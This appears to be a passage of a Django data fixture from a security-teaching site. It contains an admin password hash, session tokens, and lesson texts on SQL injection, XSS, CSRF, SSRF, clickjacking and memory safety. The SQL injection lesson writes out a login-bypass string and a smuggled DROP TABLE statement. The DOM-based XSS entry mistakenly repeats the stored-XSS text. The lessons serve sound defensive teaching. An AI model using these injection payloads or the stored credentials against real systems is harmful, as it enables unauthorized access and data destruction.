10, "codename": "delete_gptquestion"}}, {"model": "auth.permission", "pk": 40, "fields": {"name": "Can view gpt question", "content_type": 10, "codename": "view_gptquestion"}}, {"model": "auth.user", "pk": 1, "fields": {"password": "pbkdf2_sha256$720000$yG0JP2Mzaa8MpNCvkZdwtJ$rGRf5HMEie0/w8WvG2vmItzcTWfOl5FHKQzjMADcbIs=", "last_login": "2024-06-11T10:45:58.525Z", "is_superuser": true, "username": "admin", "first_name": "", "last_name": "", "email": "admin@gmail.com", "is_staff": true, "is_active": true, "date_joined": "2024-03-22T17:58:40.138Z", "groups": [], "user_permissions": []}}, {"model": "contenttypes.contenttype", "pk": 1, "fields": {"app_label": "admin", "model": "logentry"}}, {"model": "contenttypes.contenttype", "pk": 2, "fields": {"app_label": "auth", "model": "permission"}}, {"model": "contenttypes.contenttype", "pk": 3, "fields": {"app_label": "auth", "model": "group"}}, {"model": "contenttypes.contenttype", "pk": 4, "fields": {"app_label": "auth", "model": "user"}}, {"model": "contenttypes.contenttype", "pk": 5, "fields": {"app_label": "contenttypes", "model": "contenttype"}}, {"model": "contenttypes.contenttype", "pk": 6, "fields": {"app_label": "sessions", "model": "session"}}, {"model": "contenttypes.contenttype", "pk": 7, "fields": {"app_label": "coding", "model": "task"}}, {"model": "contenttypes.contenttype", "pk": 8, "fields": {"app_label": "coding", "model": "vulnerability"}}, {"model": "contenttypes.contenttype", "pk": 9, "fields": {"app_label": "coding", "model": "solvedtask"}}, {"model": "contenttypes.contenttype", "pk": 10, "fields": {"app_label": "coding", "model": "gptquestion"}}, {"model": "sessions.session", "pk": "59xyt1w6su0pshlvf6xsj8ye3nudbtqc", "fields": {"session_data": ".eJxVjEEOwiAQRe_C2hChBWZcuu8ZCAyDVA0kpV0Z765NutDtf-_9l_BhW4vfOi9-TuIilDj9bjHQg-sO0j3UW5PU6rrMUe6KPGiXU0v8vB7u30EJvXzrrLQbLUfUjMSISZvAIRrIWkdHxjAMYwbMHMFayEhOYYazATKOcBDvD_SfOBI:1ro7Fy:URPmwCi-rdUP4YLOSEjpbBq1c5DFLTW9G80QVW01Tiw", "expire_date": "2024-04-06T19:42:18.930Z"}}, {"model": "sessions.session", "pk": "7byd69vreaizkuzvwartddc2y3ut6rbn", "fields": {"session_data": ".eJxVjEEOwiAQRe_C2hChBWZcuu8ZCAyDVA0kpV0Z765NutDtf-_9l_BhW4vfOi9-TuIilDj9bjHQg-sO0j3UW5PU6rrMUe6KPGiXU0v8vB7u30EJvXzrrLQbLUfUjMSISZvAIRrIWkdHxjAMYwbMHMFayEhOYYazATKOcBDvD_SfOBI:1s0Gcx:ogb6GM560WtVqGiIpQCBsUi2tRA_R94mLnRMsxszH6Y", "expire_date": "2024-05-10T08:08:15.892Z"}}, {"model": "sessions.session", "pk": "bgexp6mx6zd47w2dw053st658i3hf31d", "fields": {"session_data": ".eJxVjEEOwiAQRe_C2hChBWZcuu8ZCAyDVA0kpV0Z765NutDtf-_9l_BhW4vfOi9-TuIilDj9bjHQg-sO0j3UW5PU6rrMUe6KPGiXU0v8vB7u30EJvXzrrLQbLUfUjMSISZvAIRrIWkdHxjAMYwbMHMFayEhOYYazATKOcBDvD_SfOBI:1s9rbN:0l8b3CvAyA736EzutbcmHRfR14jQONiY51NL2GRL8Rg", "expire_date": "2024-06-05T19:26:17.119Z"}}, {"model": "sessions.session", "pk": "cjs7rnbd9kb49ql7xlsqpmcz3ivx10ok", "fields": {"session_data": ".eJxVjEEOwiAQRe_C2hChBWZcuu8ZCAyDVA0kpV0Z765NutDtf-_9l_BhW4vfOi9-TuIilDj9bjHQg-sO0j3UW5PU6rrMUe6KPGiXU0v8vB7u30EJvXzrrLQbLUfUjMSISZvAIRrIWkdHxjAMYwbMHMFayEhOYYazATKOcBDvD_SfOBI:1s3Az7:ZBJ7KrnapO9PTuYyYhiKojSXC01J6BMW7oY2ZBeMDT4", "expire_date": "2024-05-18T08:43:09.177Z"}}, {"model": "sessions.session", "pk": "cvcyo17hk21elh95lyoalbm1kgpclzc5", "fields": {"session_data": ".eJxVjEEOwiAQRe_C2hChBWZcuu8ZCAyDVA0kpV0Z765NutDtf-_9l_BhW4vfOi9-TuIilDj9bjHQg-sO0j3UW5PU6rrMUe6KPGiXU0v8vB7u30EJvXzrrLQbLUfUjMSISZvAIRrIWkdHxjAMYwbMHMFayEhOYYazATKOcBDvD_SfOBI:1s1PaD:slX1-8ZUUjDcQayQ6SPMa2SQFH8PxiYAI_yPCHq7UaI", "expire_date": "2024-05-13T11:54:09.610Z"}}, {"model": "sessions.session", "pk": "f2lo05wuyunypr3dgbjvdk61o68mz5y5", "fields": {"session_data": ".eJxVjEEOwiAQRe_C2hChBWZcuu8ZCAyDVA0kpV0Z765NutDtf-_9l_BhW4vfOi9-TuIilDj9bjHQg-sO0j3UW5PU6rrMUe6KPGiXU0v8vB7u30EJvXzrrLQbLUfUjMSISZvAIRrIWkdHxjAMYwbMHMFayEhOYYazATKOcBDvD_SfOBI:1rnjAT:wWxLse14yONeC-_RkcHv54a4Tb81KT2m0ZiOgw47m_E", "expire_date": "2024-04-05T17:59:01.161Z"}}, {"model": "sessions.session", "pk": "fwsnfm9x90eixrrxec13oj3gc9huccxv", "fields": {"session_data": ".eJxVjEEOwiAQRe_C2hChBWZcuu8ZCAyDVA0kpV0Z765NutDtf-_9l_BhW4vfOi9-TuIilDj9bjHQg-sO0j3UW5PU6rrMUe6KPGiXU0v8vB7u30EJvXzrrLQbLUfUjMSISZvAIRrIWkdHxjAMYwbMHMFayEhOYYazATKOcBDvD_SfOBI:1rpWSq:TEP3iaMIZfhaKtKGkgGpgxuq2j-1zFZczqPzHgRRtX8", "expire_date": "2024-04-10T16:49:24.862Z"}}, {"model": "sessions.session", "pk": "fxqsmxehfm1jwszudcausolr6nsajhat", "fields": {"session_data": ".eJxVjEEOwiAQRe_C2hChBWZcuu8ZCAyDVA0kpV0Z765NutDtf-_9l_BhW4vfOi9-TuIilDj9bjHQg-sO0j3UW5PU6rrMUe6KPGiXU0v8vB7u30EJvXzrrLQbLUfUjMSISZvAIRrIWkdHxjAMYwbMHMFayEhOYYazATKOcBDvD_SfOBI:1s6naC:RN6O8rH9tjMTbzgdwal3luKkOEEgCD9Kfdqse7oIJU4", "expire_date": "2024-05-28T08:32:24.397Z"}}, {"model": "sessions.session", "pk": "kmtcs6zf71tz31dv538bn72pbogdu5l9", "fields": {"session_data": ".eJxVjEEOwiAQRe_C2hChBWZcuu8ZCAyDVA0kpV0Z765NutDtf-_9l_BhW4vfOi9-TuIilDj9bjHQg-sO0j3UW5PU6rrMUe6KPGiXU0v8vB7u30EJvXzrrLQbLUfUjMSISZvAIRrIWkdHxjAMYwbMHMFayEhOYYazATKOcBDvD_SfOBI:1ruDVm:YkXpUtJ_ImaoAHWO9gCfXz56CjVXyF7ruxj06Y1ZmLA", "expire_date": "2024-04-23T15:35:50.917Z"}}, {"model": "sessions.session", "pk": "l5qxib22lowguvebjsr2fzeulum1qvuh", "fields": {"session_data": ".eJxVjEEOwiAQRe_C2hChBWZcuu8ZCAyDVA0kpV0Z765NutDtf-_9l_BhW4vfOi9-TuIilDj9bjHQg-sO0j3UW5PU6rrMUe6KPGiXU0v8vB7u30EJvXzrrLQbLUfUjMSISZvAIRrIWkdHxjAMYwbMHMFayEhOYYazATKOcBDvD_SfOBI:1ruzvH:0ZUJkcMX6viQ363r_rQBa3KHP1Z9jrQGucX5l4_a2m8", "expire_date": "2024-04-25T19:17:23.919Z"}}, {"model": "sessions.session", "pk": "lfsapyxfpal5wjg28ys6kpe93t4qbklz", "fields": {"session_data": ".eJxVjEEOwiAQRe_C2hChBWZcuu8ZCAyDVA0kpV0Z765NutDtf-_9l_BhW4vfOi9-TuIilDj9bjHQg-sO0j3UW5PU6rrMUe6KPGiXU0v8vB7u30EJvXzrrLQbLUfUjMSISZvAIRrIWkdHxjAMYwbMHMFayEhOYYazATKOcBDvD_SfOBI:1s3dr7:YHxnFnFXDYuQADSrYFCrl20mHK7watGjmjHeOXKyfWk", "expire_date": "2024-05-19T15:32:49.146Z"}}, {"model": "sessions.session", "pk": "ouzep34b8ytdva6s1u5ehvyy8fpuxz8e", "fields": {"session_data": ".eJxVjEEOwiAQRe_C2hChBWZcuu8ZCAyDVA0kpV0Z765NutDtf-_9l_BhW4vfOi9-TuIilDj9bjHQg-sO0j3UW5PU6rrMUe6KPGiXU0v8vB7u30EJvXzrrLQbLUfUjMSISZvAIRrIWkdHxjAMYwbMHMFayEhOYYazATKOcBDvD_SfOBI:1s18J8:CkbVpv2Fph1Vv2aYgmy8wOwqTFPfho-sNk-y7LjFcEU", "expire_date": "2024-05-12T17:27:22.462Z"}}, {"model": "sessions.session", "pk": "pg2c0enxy8rd2whjx6wam3blw1110zbw", "fields": {"session_data": ".eJxVjEEOwiAQRe_C2hChBWZcuu8ZCAyDVA0kpV0Z765NutDtf-_9l_BhW4vfOi9-TuIilDj9bjHQg-sO0j3UW5PU6rrMUe6KPGiXU0v8vB7u30EJvXzrrLQbLUfUjMSISZvAIRrIWkdHxjAMYwbMHMFayEhOYYazATKOcBDvD_SfOBI:1s1jjj:t8yaIxvLEGApgfGEmBLBvlfBLUoGjPMSNJ0cY4iwUqI", "expire_date": "2024-05-14T09:25:19.255Z"}}, {"model": "sessions.session", "pk": "q6q4ub2tjb5du0j58raaqqk387l296tt", "fields": {"session_data": ".eJxVjEEOwiAQRe_C2hChBWZcuu8ZCAyDVA0kpV0Z765NutDtf-_9l_BhW4vfOi9-TuIilDj9bjHQg-sO0j3UW5PU6rrMUe6KPGiXU0v8vB7u30EJvXzrrLQbLUfUjMSISZvAIRrIWkdHxjAMYwbMHMFayEhOYYazATKOcBDvD_SfOBI:1ryqVG:PxYgbtzXFWW7Ly_mprbPXUiVqOkOT40ZvNdqWWYPo2M", "expire_date": "2024-05-06T10:02:26.636Z"}}, {"model": "sessions.session", "pk": "q7180fbmtgiax7vsarfni2eb3v6pqhgn", "fields": {"session_data": ".eJxVjEEOwiAQRe_C2hChBWZcuu8ZCAyDVA0kpV0Z765NutDtf-_9l_BhW4vfOi9-TuIilDj9bjHQg-sO0j3UW5PU6rrMUe6KPGiXU0v8vB7u30EJvXzrrLQbLUfUjMSISZvAIRrIWkdHxjAMYwbMHMFayEhOYYazATKOcBDvD_SfOBI:1s5tOY:-gM4M4wpiCkq04dNJHG0i8_7FpIyXge3Jy-3W1vRAA8", "expire_date": "2024-05-25T20:32:38.623Z"}}, {"model": "sessions.session", "pk": "uwsumw06n33wabn05wqgh4e95fl778cl", "fields": {"session_data": ".eJxVjEEOwiAQRe_C2hChBWZcuu8ZCAyDVA0kpV0Z765NutDtf-_9l_BhW4vfOi9-TuIilDj9bjHQg-sO0j3UW5PU6rrMUe6KPGiXU0v8vB7u30EJvXzrrLQbLUfUjMSISZvAIRrIWkdHxjAMYwbMHMFayEhOYYazATKOcBDvD_SfOBI:1sGz0o:2dCWYtyWlNdPmDyYS2o77ZuZNNO3pLEUPLYvGxsRSWM", "expire_date": "2024-06-25T10:45:58.536Z"}}, {"model": "sessions.session", "pk": "vdjx66uj0qcjwmy5wlifrjyh6fsqemqr", "fields": {"session_data": ".eJxVjEEOwiAQRe_C2hChBWZcuu8ZCAyDVA0kpV0Z765NutDtf-_9l_BhW4vfOi9-TuIilDj9bjHQg-sO0j3UW5PU6rrMUe6KPGiXU0v8vB7u30EJvXzrrLQbLUfUjMSISZvAIRrIWkdHxjAMYwbMHMFayEhOYYazATKOcBDvD_SfOBI:1s9rZL:pltfnsJPXZuBSIaeIu_hZPmcWppUxsa1X5eLYJ6efBg", "expire_date": "2024-06-05T19:24:11.825Z"}}, {"model": "sessions.session", "pk": "yb1qs8r5pqva919sc2ac6isg0ne82jlb", "fields": {"session_data": ".eJxVjEEOwiAQRe_C2hChBWZcuu8ZCAyDVA0kpV0Z765NutDtf-_9l_BhW4vfOi9-TuIilDj9bjHQg-sO0j3UW5PU6rrMUe6KPGiXU0v8vB7u30EJvXzrrLQbLUfUjMSISZvAIRrIWkdHxjAMYwbMHMFayEhOYYazATKOcBDvD_SfOBI:1rzYlR:VFWWlwInBMi6O6jSwsPXowpYsYQNocQfFFvBcPz4xbY", "expire_date": "2024-05-08T09:18:05.638Z"}}, {"model": "sessions.session", "pk": "yks4p98q5zw87guc41sxqp5cyyg5ezxr", "fields": {"session_data": ".eJxVjEEOwiAQRe_C2hChBWZcuu8ZCAyDVA0kpV0Z765NutDtf-_9l_BhW4vfOi9-TuIilDj9bjHQg-sO0j3UW5PU6rrMUe6KPGiXU0v8vB7u30EJvXzrrLQbLUfUjMSISZvAIRrIWkdHxjAMYwbMHMFayEhOYYazATKOcBDvD_SfOBI:1s11Sm:aCakEyXbw-A06jBUGsYm1SzxcXaKH6ljyyVrK8EKdm4", "expire_date": "2024-05-12T10:08:52.897Z"}}, {"model": "coding.vulnerability", "pk": 1, "fields": {"name": "SQL injection", "slug": "sql-injection", "description": "<div class=\"mx-auto\" style=\"max-width: 1000px;\">\r\n        <p>SQL Injection is a common web security vulnerability that allows attackers to interfere with the queries that an application makes to its database. This can lead to unauthorized access, data manipulation, or even data deletion. Understanding SQL Injection, its risks, examples, and prevention methods are crucial for developers and security professionals to safeguard against potential attacks.</p>\r\n        <div style=\"text-align: center;\">\r\n            <img class=\"mx-auto\" src=\"../../static/coding/images/sql-1.png\" style=\"width: 700px;\"/>\r\n        </div>\r\n        <h5>How SQL Injection Works</h5>\r\n        <p>SQL Injection occurs when an attacker inserts malicious SQL code into a query. This code is then executed by the database, allowing the attacker to perform various actions, such as retrieving sensitive data or modifying the database's content.</p>\r\n        <h5>Risks of SQL Injection</h5>\r\n        <ol>\r\n            <li><b>Data Leakage:</b> Attackers can extract sensitive information from the database, including usernames, passwords, and personal data.</li>\r\n            <li><b>Data Manipulation:</b> Attackers can modify or delete data stored in the database, leading to integrity issues.</li>\r\n            <li><b>Unauthorized Access:</b> Attackers can bypass authentication mechanisms and gain unauthorized access to the application or sensitive areas of the database.</li>\r\n            <li><b>Denial of Service (DoS):</b> SQL Injection attacks can be used to overload the database server, leading to service disruptions.</li>\r\n        </ol>\r\n        <h5>Examples of SQL Injection</h5>\r\n        <b>Retrieving Data</b>\r\n        <p>Consider a login form where the username and password are checked against a SQL query:</p>\r\n        <img class=\"mx-auto\" src=\"../../static/coding/images/sql-ex1.png\" style=\"width: 800px;\"/>\r\n        <p>An attacker can bypass authentication by entering a malicious username such as ' OR 1=1 -- which would modify the query to:</p>\r\n        <img class=\"mx-auto\" src=\"../../static/coding/images/sql-ex2.png\" style=\"width: 800px;\"/>\r\n        <p>This query will return all rows from the users table, effectively granting unauthorized access.</p>\r\n        <b>Modifying Data</b>\r\n        <p>Suppose an application allows users to update their profile information:</p>\r\n        <img class=\"mx-auto\" src=\"../../static/coding/images/sql-ex3.png\" style=\"width: 700px;\"/>\r\n        <p>An attacker can manipulate the query by inputting ' WHERE user_id = '1'; DROP TABLE profiles; -- resulting in:</p>\r\n        <img class=\"mx-auto\" src=\"../../static/coding/images/sql-ex4.png\" style=\"width: 800px;\"/>\r\n        <p>This query not only updates the user's bio but also drops the entire profiles table, causing data loss.</p>\r\n        <h5>Preventing SQL Injection</h5>\r\n        <ol>\r\n            <li><b>Parameterized Queries:</b> Use parameterized queries (prepared statements) with placeholders for user input. This ensures that input values are treated as data, not executable code.</li>\r\n            <li><b>Input Validation:</b> Validate and sanitize user input to ensure that it conforms to expected patterns and does not contain malicious content.</li>\r\n            <li><b>Least Privilege Principle:</b> Limit the permissions of database accounts to minimize the potential impact of a successful SQL Injection attack.</li>\r\n            <li><b>Web Application Firewalls (WAF):</b> Implement WAFs to monitor and filter HTTP traffic, detecting and blocking SQL Injection attempts.</li>\r\n            <li><b>Regular Security Audits:</b> Conduct regular security audits and vulnerability assessments to identify and address potential SQL Injection vulnerabilities proactively.</li>\r\n        </ol>\r\n        <p>SQL Injection remains a prevalent threat to web applications, posing significant risks to data security and integrity. By understanding how SQL Injection works, recognizing its risks, and implementing effective prevention measures, developers and security professionals can mitigate the likelihood and impact of SQL Injection attacks, ensuring the safety of web applications and their underlying databases.</p>\r\n    </div>"}}, {"model": "coding.vulnerability", "pk": 2, "fields": {"name": "Cross-site scripting (XSS)", "slug": "xss", "description": "<div class=\"mx-auto\" style=\"max-width: 1000px;\">\r\n        <p>Cross-Site Scripting (XSS) is a type of security vulnerability commonly found in web applications. It allows attackers to inject malicious scripts into web pages viewed by other users. These scripts can then execute in the browsers of unsuspecting users, leading to the theft of sensitive information, session hijacking, or even complete control over the victim's account.</p>\r\n        <div style=\"text-align: center;\">\r\n            <img class=\"mx-auto\" src=\"../../static/coding/images/XSS-1.png\" style=\"width: 700px;\"/>\r\n        </div>\r\n        <h5>Types of XSS</h5>\r\n        <ol>\r\n            <li><b>Reflected XSS:</b> In this type of XSS, the malicious script is injected into the web application, and the application reflects it back to the user's browser. This often occurs through unvalidated input fields or URLs.Example: An attacker sends a link to a victim with a crafted URL containing a malicious script. When the victim clicks on the link, the script executes in their browser.</li>\r\n            <li><b>Stored XSS:</b> Also known as persistent XSS, this occurs when the injected malicious script is permanently stored on the target server, such as in a database or message board. Whenever a user accesses the compromised page, the script executes.Example: An attacker posts a message containing a malicious script on a forum. When other users view the message, the script runs in their browsers.</li>\r\n            <li><b>DOM-based XSS:</b> Also known as persistent XSS, this occurs when the injected malicious script is permanently stored on the target server, such as in a database or message board. Whenever a user accesses the compromised page, the script executes.Example: An attacker posts a message containing a malicious script on a forum. When other users view the message, the script runs in their browsers.</li>\r\n        </ol>\r\n        <h5>Examples</h5>\r\n        <p>This code is vulnerable to XSS (Cross-Site Scripting) attack. By directly using the value of window.location.hash in the innerHTML, a malicious actor can inject malicious JavaScript into the URL, which will be executed in the context of the page represented by the element with id \"content\", allowing them to access user's sensitive information or modify the page.</p>\r\n        <img class=\"mx-auto\" src=\"../../static/coding/images/xss-ex1.png\" style=\"width: 800px;\"/>\r\n        <p>\r\n            This script demonstrates a security flaw called cross-site scripting (XSS), where an attacker injects malicious code into a webpage. In this instance, the injected code sends the user's cookies to the attacker's server, posing a risk of unauthorized access to sensitive information.</p>\r\n        <img class=\"mx-auto\" src=\"../../static/coding/images/xss-ex2.png\" style=\"width: 800px;\"/>\r\n        <h5>Detecting XSS Vulnerabilities</h5>\r\n        <ol>\r\n            <li><b>Manual Code Review:</b> Developers can manually review their codebase to identify potential XSS vulnerabilities. They should pay particular attention to user input fields, URL parameters, and dynamic content generation.Example: Reviewing JavaScript files for instances where user input is directly concatenated into HTML.</li>\r\n            <li><b>Automated Scanning Tools:</b> Various tools are available that automatically scan web applications for XSS vulnerabilities. These tools simulate attacks by injecting payloads into input fields and analyzing the responses for signs of XSS.Example: Using tools like OWASP ZAP or Burp Suite to scan web applications for security flaws.</li>\r\n        </ol>\r\n        <h5>Preventing XSS Attacks</h5>\r\n        <ol>\r\n            <li><b>Input Validation:</b> Validate and sanitize all user inputs before processing or displaying them on a web page. This prevents attackers from injecting malicious scripts into the application.Example: If expecting a numeric input, ensure that the input consists only of numbers.</li>\r\n            <li><b>Output Encoding:</b> Encode all user-generated content before displaying it on a web page. This converts potentially dangerous characters into their HTML entity equivalents, rendering them harmless.Example: Converting < to &lt; and > to &gt;.</li>\r\n            <li><b>Content Security Policy (CSP): </b> Implement CSP headers on web servers to restrict the sources from which browsers can load content. This helps prevent XSS attacks by blocking the execution of scripts from unauthorized sources.Example: Setting a CSP header that only allows scripts to be executed from specific domains.</li>\r\n        </ol>\r\n    </div>"}}, {"model": "coding.vulnerability", "pk": 3, "fields": {"name": "Cross-site request forgery (CSRF)", "slug": "csrf", "description": "<div class=\"mx-auto\" style=\"max-width: 1000px;\">\r\n        <p>Cross-site request forgery (CSRF) is a security vulnerability in web applications that allows an attacker to exploit the trust a site has in a user's browser by tricking the user into performing unintended actions while authenticated. This type of attack targets state-changing requests by leveraging the user's credentials, typically through requests that automatically include session cookies. CSRF vulnerabilities can be mitigated by using anti-CSRF tokens, setting the SameSite attribute on cookies to restrict cross-site requests, and implementing strict CORS policies to limit interactions with the web application from unauthorized domains.</p>\r\n        <div style=\"text-align: center;\">\r\n            <img src=\"../../static/coding/images/csrf-1.png\" style=\"width: 700px;\"/>\r\n        </div>\r\n        <h5>Understanding CSRF</h5>\r\n        <p>CSRF attacks exploit the trust that a site has in a user's browser. Here is how a typical CSRF attack works:</p>\r\n        <ol>\r\n            <li><b>User Login:</b> The user logs into a website, www.example.com, and receives a session cookie.</li>\r\n            <li><b>Malicious Request:</b> The attacker tricks the user into visiting another website, www.malicious.com, which includes an unwanted action that targets www.example.com. This could be in the form of a hidden form or JavaScript that automatically submits a request.</li>\r\n            <li><b>Exploitation:</b> When the malicious site loads, it automatically sends a request to www.example.com with the userТs credentials, exploiting the user's authenticated session.</li>\r\n        </ol>\r\n        <h5>Example of a CSRF Attack</h5>\r\n        <p>Imagine a user is logged into their bank account, and they receive an email containing a link to an innocent-looking website. Unknown to the user, the website contains a hidden form that is automatically submitted by JavaScript when the page loads. The form might execute a transaction to transfer money from the userТs account to the attackerТs account.</p>\r\n        <p>Here is a basic example of the HTML code that might be used in such an attack:</p>\r\n        <img class=\"mx-auto\" src=\"../../static/coding/images/csrf-ex1.png\" style=\"width: 700px;\"/>\r\n        \r\n        <h5>Preventing CSRF</h5>\r\n        <ol>\r\n            <li><b>CSRF Tokens:</b> Secure sites generate unique random tokens for each user session. Requests to the server must include this token; otherwise, theyТre rejected. This token ensures that the request originated from the site and not a third party.</li>\r\n            <li><b>SameSite Cookie Attribute:</b> The SameSite cookie attribute can be used to restrict the sending of cookies with cross-site requests. For example, setting the SameSite attribute to Strict ensures the cookie is only sent in a first-party context.</li>\r\n            <li><b>Double Submit Cookie:</b> A variation of the CSRF token technique where the token is stored in a cookie and also sent as a request parameter.</li>\r\n            <li><b>Checking the Referer Header:</b> Validating the Referer header can help ensure the request is coming from a trusted domain. However, some privacy tools strip the Referer header, which can lead to false negatives.</li>\r\n        </ol>\r\n        <p>Preventing CSRF requires a combination of server-side and client-side measures. While tokens are currently the most effective prevention technique, developers must also consider implementing multiple layers of security to protect against different types of CSRF attacks. Understanding and defending against CSRF is crucial for maintaining secure web applications.</p>\r\n    </div>"}}, {"model": "coding.vulnerability", "pk": 4, "fields": {"name": "Server-side request forgery (SSRF)", "slug": "ssrf", "description": "<div class=\"mx-auto\" style=\"max-width: 1000px;\">\r\n        <p>Server-Side Request Forgery (SSRF) is a type of web security vulnerability that allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain of the attacker's choosing. This exploit can lead to unauthorized actions, information disclosure, and interaction with internal services from the server's perspective.</p>\r\n        <div style=\"text-align: center;\">\r\n            <img class=\"mx-auto\" src=\"../../static/coding/images/ssrf.png\" style=\"width: 700px;\"/>\r\n        </div>\r\n        <h5>How Does SSRF Work?</h5>\r\n        <p>In an SSRF attack, the attacker manipulates the server into performing requests that should typically not be accessible. This is often achieved through a vulnerable web application that accepts a URL or an IP address from user input without proper validation and sanitization. The server uses this user-supplied URL to fetch data, connect to services, or perform actions, mistakenly giving the attacker control over the requests.</p>\r\n        <h5>Common Scenarios and Examples</h5>\r\n        <ol>\r\n            <li><b>Basic SSRF against the internal system:</b></li>\r\n            <img class=\"mx-auto\" src=\"../../static/coding/images/ssrf-ex1.png\" style=\"width: 550px;\"/>\r\n            <p>In this scenario, an attacker uses the fetch functionality of a web application to access an internal administration dashboard that should not be accessible externally.</p>\r\n            <li><b>SSRF with whitelist bypass:</b> </li>\r\n            <img class=\"mx-auto\" src=\"../../static/coding/images/ssrf-ex2.png\" style=\"width: 400px;\"/>\r\n            <p>Here, the attacker exploits an SSRF by targeting the loopback address (127.0.0.1) which is often overlooked in security configurations. This can access services running on the server itself.</p>\r\n            <li><b>Blind SSRF for reconnaissance:</b></li>\r\n            <img class=\"mx-auto\" src=\"../../static/coding/images/ssrf-ex3.png\" style=\"width: 580px;\"/>\r\n            <p>This example targets AWS metadata services which can be exploited to extract sensitive information such as credentials, thus enabling further attacks.</p>\r\n        </ol>\r\n\r\n        <h5>Prevention Techniques</h5>\r\n        <ul>\r\n            <li><b>Input Validation:</b> Restrict URL input from users by implementing a strong validation scheme. This includes validating schemes, ports, and the format of URLs to prevent unintended destinations.</li>\r\n            <li><b>Use of Allowlists:</b> Define strict allowlists for URLs or IP addresses that your server can request, blocking all other addresses not explicitly allowed.</li>\r\n            <li><b>Limiting Redirects and Forwards:</b> Avoid following redirects automatically and verify the legitimacy of the destination before proceeding.</li>\r\n            <li><b>Network Segmentation:</b> Separate critical internal networks from areas accessible by external web applications. Employing a Demilitarized Zone (DMZ) can help limit the reach of potential SSRF exploits.</li>\r\n            <li><b>Patch and Monitor:</b> Regularly update and patch software components. Monitor logs for unusual HTTP requests that might indicate SSRF attempts.</li>\r\n        </ul>\r\n        <h5>SSRF in Real-World Applications</h5>\r\n        <p>In real-world applications, SSRF vulnerabilities have been exploited in major platforms, including cloud services where attackers have accessed metadata services to escalate privileges or access sensitive data. It's crucial for developers and security teams to recognize the patterns that lead to SSRF and secure applications against such vulnerabilities.</p>\r\n        <p>SSRF remains a potent threat primarily due to the increasing complexity of web applications and their interactions with numerous external systems and services. Understanding the mechanics of SSRF attacks, their potential impacts, and how to defend against them is essential for securing modern web environments.</p>\r\n    </div>"}}, {"model": "coding.vulnerability", "pk": 5, "fields": {"name": "Clickjacking", "slug": "Clickjacking", "description": "<div class=\"mx-auto\" style=\"max-width: 1000px;\">\r\n        <p>Clickjacking, also known as a \"UI redress attack,\" is a malicious technique where an attacker tricks a user into clicking on something different from what the user perceives. This can potentially expose confidential information or allow others to take control of their computer while clicking on seemingly innocuous web objects including buttons, images, or other elements.</p>\r\n        <p>Clickjacking involves overlaying an invisible or disguised webpage over a visible webpage that the user interacts with. Thus, when users click on what they believe to be visible elements, they actually perform actions on the hidden page.</p>\r\n        <div style=\"text-align: center;\">\r\n            <img class=\"mx-auto\" src=\"../../static/coding/images/clickjacking.png\" style=\"width: 700px;\"/>\r\n        </div>\r\n        <h5>How Clickjacking Works</h5>\r\n        <ol>\r\n            <li><b>Layering:</b> The attacker places an invisible layer over an enticing webpage. For instance, overlaying a transparent frame over a button that says \"Click here to win a prize!\" but in reality, itТs a social media \"Like\" button.</li>\r\n            <li><b>Iframing:</b> Using an iframe tag, a webpage can be embedded invisibly within another page. Users think they are interacting with the top page, but they are actually interacting with the content in the iframe.</li>\r\n            <li><b>Manipulating Opacity:</b> Setting the CSS opacity of the malicious iframe to 0 can make it invisible but still clickable.</li>\r\n            <li><b>Cursor Hijacking:</b> Using JavaScript, attackers can change the cursorТs location on the screen. Even if a user moves their mouse to a safe area, the click might register in an unintended area.</li>\r\n        </ol>\r\n\r\n        <h5>Examples of Clickjacking</h5>\r\n        <ul>\r\n            <li><b>Likejacking:</b> A hidden Facebook \"Like\" button is overlaid on a video play button. When users try to play the video, they unintentionally like a page which might be spreading malware.</li>\r\n            <li><b>Credential Theft:</b> Overlaying a login form on a video. As users input their credentials, thinking they are logging into a legitimate service, their information is sent to the attackerТs server.</li>\r\n        </ul>\r\n\r\n        <h5>Examples of Clickjacking</h5>\r\n        <ul>\r\n            <li><b>Frame Busting Scripts:</b> Scripts that prevent a webpage from being framed by another site. Although not foolproof, it helps in reducing the risk.</li>\r\n            <li><b>X-Frame-Options HTTP Header:</b> This header tells browsers to prevent a webpage from being framed. It can be set to DENY, which blocks all framing attempts, or SAMEORIGIN, which allows framing only by the same site.</li>\r\n            <li><b>Content Security Policy (CSP):</b> CSP can be used to specify which domains are allowed to frame the content of your site, providing a more robust defense than X-Frame-Options.</li>\r\n            <li><b>User Education:</b> Teaching users to be cautious about where they click and encouraging them to update their browser software to benefit from the latest security enhancements.</li>\r\n        </ul>\r\n        <p>Clickjacking remains a serious security concern as it exploits the user's trust and interactions with a website. By implementing proper security measures and educating users, the risk associated with clickjacking attacks can be significantly mitigated.</p>\r\n    </div>"}}, {"model": "coding.vulnerability", "pk": 6, "fields": {"name": "Memory safety vulnerabilities", "slug": "memory-safety", "description": "<div class=\"mx-auto\" style=\"max-width: 1000px;\">\r\n        <p>Memory safety vulnerabilities are critical issues that can occur in software development, particularly in languages that allow manual memory management, such as C and C++. These vulnerabilities can lead to a variety of problems, including software crashes, data corruption, and security breaches. Understanding these vulnerabilities and the techniques for mitigating them is crucial for developers to create secure and reliable software.</p>\r\n        <p>Memory safety refers to the protection of memory space from unauthorized access and corruption. A program is memory safe if it accesses only allocated and appropriate types of memory during its execution. When memory safety is violated, it often leads to vulnerabilities such as buffer overflows, use-after-free errors, and other related issues.</p>\r\n        <div style=\"text-align: center;\">\r\n            <img class=\"mx-auto\" src=\"../../static/coding/images/memory.png\" style=\"width: 700px;\"/>\r\n        </div>\r\n        \r\n        <h5>Common Memory Safety Vulnerabilities</h5>\r\n        <ol>\r\n            <li><b>Buffer Overflow:</b> This occurs when a program writes more data to a buffer than it can hold. This excess data can overwrite adjacent memory, which might contain other variables, program state, or even control-flow information. Buffer overflows can lead to arbitrary code execution, system crashes, or data corruption.</li>\r\n            <li><b>Use-After-Free:</b> This vulnerability arises when a program continues to use a pointer after the memory it points to has been freed. Accessing freed memory can lead to unpredictable behavior, as the memory may be reallocated and modified by another part of the program.</li>\r\n            <li><b>Null Pointer Dereference:</b> Accessing a pointer that has not been initialized or is set to NULL leads to this issue. It typically results in a program crash, as the program attempts to access memory that is not available.</li>\r\n            <li><b>Memory Leaks:</b> While not directly a cause of crashes or immediate security vulnerabilities, memory leaks occur when allocated memory is not freed properly. Over time, this can lead to a shortage of memory, causing performance issues or system crashes.</li>\r\n        </ol>\r\n        <h5>Mitigation Techniques</h5>\r\n        <ol>\r\n            